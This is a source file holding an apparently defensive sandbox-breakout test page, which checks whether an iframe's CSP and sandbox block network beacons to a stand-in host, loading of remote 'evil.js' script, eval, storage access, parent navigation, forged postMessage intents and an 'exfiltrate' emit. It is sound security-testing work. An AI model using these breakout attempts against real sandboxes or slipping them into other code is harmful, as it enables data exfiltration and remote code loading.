/**
 * Adversarial artifact body. Each test tries to break out of the sandbox in a
 * different way. All results are reported back via sandbox.emit('report', ...).
 *
 * PASS = reported as "blocked"
 * FAIL = reported as "allowed"
 *
 * The host tallies results.
 */
export const ADVERSARIAL_BODY_HTML = /* html */ `
<div style="padding: var(--space-4); font-family: var(--font-mono); font-size: var(--text-xs)">
  <div style="font-weight: 600; margin-bottom: var(--space-2);">Adversarial sandbox</div>
  <div>Running breakout tests and reporting back…</div>
  <div id="marker" style="margin-top: var(--space-3); color: var(--color-text-muted);"></div>
</div>

<script>
(() => {
  const cspViolations = [];
  document.addEventListener('securitypolicyviolation', (e) => {
    cspViolations.push({
      directive: e.violatedDirective,
      blocked: e.blockedURI,
    });
  });

  function report(test, status, detail) {
    sandbox.emit('report', { test, status, detail: String(detail || '') });
  }

  async function run(name, fn) {
    const before = cspViolations.length;
    try {
      const result = await Promise.race([
        Promise.resolve().then(fn),
        new Promise((_, rej) => setTimeout(() => rej(new Error('timeout 2s')), 2000)),
      ]);
      const after = cspViolations.slice(before);
      if (after.length > 0) {
        report(name, 'blocked', 'CSP:' + after[0].directive);
      } else {
        report(name, 'allowed', typeof result === 'string' ? result : JSON.stringify(result));
      }
    } catch (err) {
      const after = cspViolations.slice(before);
      const detail = after.length > 0 ? 'CSP:' + after[0].directive : (err && err.message || String(err));
      report(name, 'blocked', detail);
    }
  }

  async function runAll() {
    // Network — should all be blocked by connect-src 'none'
    await run('fetch-external', async () => {
      const r = await fetch('https://example.com/');
      return 'status=' + r.status;
    });
    await run('xhr-external', () => new Promise((resolve, reject) => {
      const xhr = new XMLHttpRequest();
      xhr.onload = () => resolve('status=' + xhr.status);
      xhr.onerror = () => reject(new Error('xhr error'));
      xhr.open('GET', 'https://example.com/');
      xhr.send();
    }));
    await run('websocket-external', () => new Promise((resolve, reject) => {
      try {
        const ws = new WebSocket('wss://example.com/');
        ws.onopen = () => resolve('opened');
        ws.onerror = () => reject(new Error('ws error'));
        setTimeout(() => reject(new Error('ws timeout')), 500);
      } catch (err) { reject(err); }
    }));
    await run('eventsource-external', () => new Promise((resolve, reject) => {
      try {
        const es = new EventSource('https://example.com/stream');
        es.onopen = () => resolve('opened');
        es.onerror = () => reject(new Error('es error'));
        setTimeout(() => reject(new Error('es timeout')), 500);
      } catch (err) { reject(err); }
    }));
    await run('sendbeacon-external', () => new Promise((resolve, reject) => {
      const ok = navigator.sendBeacon && navigator.sendBeacon('https://example.com/', 'x');
      setTimeout(() => {
        if (ok) resolve('queued');
        else reject(new Error('sendBeacon returned false'));
      }, 300);
    }));

    // Image beacon — img-src data: only, external must fail
    await run('img-beacon-external', () => new Promise((resolve, reject) => {
      const img = new Image();
      img.onload = () => resolve('loaded');
      img.onerror = () => reject(new Error('img error'));
      img.src = 'https://example.com/1x1.png';
      setTimeout(() => reject(new Error('img timeout')), 500);
    }));

    // External script load
    await run('script-external', () => new Promise((resolve, reject) => {
      const s = document.createElement('script');
      s.onload = () => resolve('loaded');
      s.onerror = () => reject(new Error('script error'));
      s.src = 'https://example.com/evil.js';
      document.head.appendChild(s);
      setTimeout(() => reject(new Error('script timeout')), 500);
    }));
    await run('dynamic-import', async () => {
      // eslint-disable-next-line no-new-func
      const mod = await import('https://example.com/evil.js');
      return 'module=' + typeof mod;
    });

    // Eval — blocked by no 'unsafe-eval'
    await run('eval', () => {
      // eslint-disable-next-line no-eval
      const x = eval('1+1');
      return 'eval=' + x;
    });
    await run('Function-constructor', () => {
      const x = new Function('return 1+1')();
      return 'fn=' + x;
    });

    // Storage — sandbox blocks DOM storage for null-origin iframes
    await run('localStorage', () => {
      localStorage.setItem('x', 'y');
      return 'set=' + localStorage.getItem('x');
    });
    await run('sessionStorage', () => {
      sessionStorage.setItem('x', 'y');
      return 'set=' + sessionStorage.getItem('x');
    });
    await run('indexedDB', () => new Promise((resolve, reject) => {
      const req = indexedDB.open('summon-evil', 1);
      req.onsuccess = () => resolve('opened');
      req.onerror = () => reject(new Error('idb error'));
      setTimeout(() => reject(new Error('idb timeout')), 500);
    }));
    await run('document.cookie-set', () => {
      document.cookie = 'x=y';
      if (document.cookie) return 'cookie=' + document.cookie;
      throw new Error('cookie write ignored');
    });

    // Navigation / parent access
    await run('top-navigation', () => {
      window.top.location = 'https://example.com/';
      return 'navigated';
    });
    await run('parent-navigation', () => {
      window.parent.location = 'https://example.com/';
      return 'navigated';
    });
    await run('read-parent-location', () => {
      const href = window.parent.location.href;
      return 'href=' + href;
    });
    await run('popup', () => {
      const w = window.open('https://example.com/', '_blank');
      if (w) return 'opened';
      throw new Error('open returned null');
    });

    // Form submission
    await run('form-action-external', () => new Promise((resolve, reject) => {
      const f = document.createElement('form');
      f.method = 'POST';
      f.action = 'https://example.com/';
      f.target = '_top';
      document.body.appendChild(f);
      try {
        f.submit();
        setTimeout(() => {
          if (location.hostname === '' || location.href.indexOf('example.com') === -1) {
            reject(new Error('no navigation'));
          } else {
            resolve('submitted');
          }
        }, 300);
      } catch (err) { reject(err); }
    }));

    // Nested iframe
    await run('nested-iframe-external', () => new Promise((resolve, reject) => {
      const f = document.createElement('iframe');
      f.onload = () => setTimeout(() => resolve('loaded'), 300);
      f.onerror = () => reject(new Error('frame error'));
      f.src = 'https://example.com/';
      document.body.appendChild(f);
      setTimeout(() => reject(new Error('frame timeout')), 500);
    }));

    // SDK integrity
    await run('overwrite-sandbox-sdk', () => {
      const before = window.sandbox;
      window.sandbox = { emit: () => {}, onState: () => {}, state: {} };
      if (window.sandbox === before) {
        throw new Error('assignment ignored; SDK stayed immutable');
      }
      return window.sandbox.emit.toString();
    });
    await run('read-sandbox-id', () => {
      const id = window.__SUMMON_SANDBOX_ID__;
      if (id) return 'id=' + id;
      throw new Error('undefined');
    });

    // Forged intent with wrong sandbox_id — host must drop silently. If the
    // host incorrectly accepts it, the injected report below creates a failing
    // result row before this delayed pass report runs.
    window.parent.postMessage({
      type: 'SUMMON_INTENT',
      sandbox_id: 'deadbeef',
      intent: 'report',
      args: { test: 'forge-intent-wrong-id', status: 'allowed', detail: 'wrong sandbox_id was delivered' },
    }, '*');
    await new Promise((resolve) => setTimeout(resolve, 150));
    report('forge-intent-wrong-id', 'blocked', 'wrong sandbox_id was not delivered');

    // Unknown intent — host must reject
    await run('emit-unknown-intent', () => {
      sandbox.emit('exfiltrate', { data: 'secret' });
      return 'emitted';
    });

    // Artifact-declared but not host-granted. The artifact lists 'escalate'
    // in its own intents — but the host's grant excludes it, and the bridge
    // is supposed to enforce the grant, not the declaration.
    await run('emit-declared-but-not-granted', () => {
      sandbox.emit('escalate', { test: 'emit-declared-but-not-granted' });
      return 'emitted';
    });

    report('__DONE__', 'info', '');
  }

  // Start once bootstrap is ready.
  if (window.sandbox) {
    document.getElementById('marker').textContent = 'Tests started';
    runAll();
  } else {
    document.getElementById('marker').textContent = 'ERROR: window.sandbox not installed';
    // No way to report back without sandbox.emit — this is visible only in-iframe.
  }
})();
</script>
`;
